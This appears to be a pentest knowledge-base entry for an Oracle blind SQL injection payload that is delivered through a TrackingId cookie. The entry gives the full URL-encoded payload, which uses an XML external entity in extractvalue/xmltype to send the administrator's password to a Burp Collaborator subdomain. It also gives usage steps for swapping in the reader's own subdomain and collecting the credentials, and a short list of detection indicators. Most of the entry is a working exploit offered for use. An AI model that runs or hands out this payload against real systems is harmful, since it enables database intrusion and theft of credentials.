---
id: 18ffb6fa-4b27-4c79-956a-f8c9654d2abf
type: code
language: sql
verified: true
created_at: '2020-08-11T16:11:07.653478+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - blind SQL
  - injection
  - payload
  - oracle
validated: true
---

# Oracle-Blind-SQLi-Out-Of-Band-Payload-via-Cookie

## Code

```sql
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual—
```

## Description

This SQL payload exploits blind SQL injection in an Oracle database via a cookie parameter (e.g., TrackingId). It uses the extractvalue function with a malicious XML document to trigger an out-of-band HTTP request to an attacker-controlled server. The payload concatenates a selected value (e.g., administrator password) into the URL, allowing exfiltration through DNS resolution or HTTP access. It is designed for confirmation of injection in scenarios where in-band responses are unavailable.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| YOUR-SUBDOMAIN-HERE | Unique subdomain from Burp Collaborator or similar OOB tool for monitoring interactions | abc123xyz.burpcollaborator.net |

## Usage

Substitute the YOUR-SUBDOMAIN-HERE placeholder with your monitoring server's subdomain. Inject this payload into the cookie value during a proxied request (e.g., via Burp Suite). Monitor the OOB server for incoming DNS/HTTP requests to confirm execution and potentially exfiltrate data like database credentials.

This code is used in procedures like [[procedures/Identifying-Blind-SQL-Injection-Out-Of-Band-via-Cookie-Parameter]] for vulnerability identification in web applications.

## Detection

- Web application firewall (WAF) rules detecting XML entity expansions or UNION SELECT patterns in cookies.
- Database audit logs showing extractvalue or xmltype calls with external entities.
- Network monitoring for anomalous outbound DNS queries to unregistered or suspicious subdomains from application servers.
- Proxy logs revealing modified cookie values with encoded SQL payloads.
